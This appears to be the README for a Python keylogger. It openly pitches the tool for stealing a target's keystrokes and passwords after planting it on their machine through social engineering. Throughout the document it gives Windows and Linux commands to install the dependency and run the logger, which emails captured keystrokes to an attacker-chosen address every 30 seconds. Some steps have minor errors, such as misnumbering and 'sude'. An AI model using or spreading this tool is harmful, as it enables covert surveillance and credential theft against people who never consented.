Keylogger is a tool that helps you when you try to capture your target's keystrokes on his/her keyboard. You can use it as a Username-Password hijacking tool when you upload this program as a executable file (via social engineering) to your target's machine.

USAGE: 
```
1.1-) FOR WINDOWS: Open cmd and write this command -> cd Desktop
1.2-) C:\Users\IEUser\Appdata\Local\Programs\Python\Python310\python.exe -m pip install pynput(First part is your python.exe's location change it properly for your device python.exe location)      
1.3-) After you install pynput library, run the KeyLogger with -> C:\Users\IEUser\Appdata\Local\Programs\Python\Python310\python.exe python3 MyKeyLogger.py -m (Keylogger sender E-mail address) -t (Keylogger logs receiver E-mail address) -p (Sender E-mail adress' password)
1.4-) After that, keylogger will capture all of the keystrokes on the target machine and will send E-mails that contains keystrokes from the target.   
2.1-) FOR LINUX: Open terminal and write this command -> pip3 install pynput
1.2-) cd /root/PycharmProjects/Keylogger
1.3-) python3 MyKeyLogger.py -m (Keylogger sender E-mail address) -t (Keylogger logs receiver E-mail address) -p (Sender E-mail adress' password)
1.4-) If you have any problem in LINUX do as follows : 
      sudo apt update
      sude apt install python3
      sudo apt-get install python3-dev
      sudo apt install python3-pip 
```
And your program will run without any error.
IMPORTANT NOTE: The first mail on the receiver e-mail will be empty. Ignore it, the second mail will come after 30 seconds and will contain the keylogs of the target machine.
                            
                            
       
